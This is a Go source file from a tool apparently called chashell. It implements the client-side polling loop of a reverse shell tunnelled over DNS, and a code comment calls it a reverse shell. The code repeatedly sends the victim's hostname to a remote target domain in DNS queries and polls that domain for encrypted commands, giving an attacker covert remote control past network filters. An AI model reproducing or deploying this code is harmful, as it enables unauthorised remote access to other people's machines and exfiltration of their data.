package transport

import (
	"chashell/lib/logging"
	"chashell/lib/protocol"
	"os"
	"strings"
	"time"
)

// Create a queue were polling data will be sent.
var packetQueue = make(chan []byte, 100)

func pollRead(stream dnsStream) {
	sendInfoPacket(stream)
	loopCounter := 0
	for {
		// Sleep, this is a reverse-shell, not a DNS Stress testing tool.
		time.Sleep(200 * time.Millisecond)
		// Check for data !
		poll(stream)
		loopCounter += 1

		// Send infoPacket each 60 seconds.
		if loopCounter % 300 == 0 {
			sendInfoPacket(stream)
		}
	}
}

func poll(stream dnsStream) {

	// Create a "polling" request.
	pollQuery := &protocol.Message{
		Clientguid: stream.clientGuid,
		Packet: &protocol.Message_Pollquery{
			Pollquery: &protocol.PollQuery{},
		},
	}

	pollPacket, err := dnsMarshal(pollQuery, stream.encryptionKey, true)

	if err != nil {
		logging.Fatal("Poll marshaling fatal error : %v\n", err)
	}

	answers, err := sendDNSQuery([]byte(pollPacket), stream.targetDomain)
	if err != nil {
		logging.Printf("Could not get answer : %v\n", err)
		return
	}

	if len(answers) > 0 {
		packetData := strings.Join(answers, "")
		if packetData == "-" {
			return
		}
		output, complete := Decode(packetData, stream.encryptionKey)
		if complete {
			packetQueue <- output
		} else {
			// More data available. Get it!
			poll(stream)
		}

	}
}

func sendInfoPacket(stream dnsStream){
	// Get hostname.
	name, err := os.Hostname()
	if err != nil {
		logging.Println("Could not get hostname.")
		return
	}

	// Create infoPacket containing hostname.
	infoQuery := &protocol.Message{
		Clientguid: stream.clientGuid,
		Packet: &protocol.Message_Infopacket{
			Infopacket: &protocol.InfoPacket{Hostname: []byte(name)},
		},
	}

	// Send packet.
	pollPacket, err := dnsMarshal(infoQuery, stream.encryptionKey, true)
	sendDNSQuery([]byte(pollPacket), stream.targetDomain)
}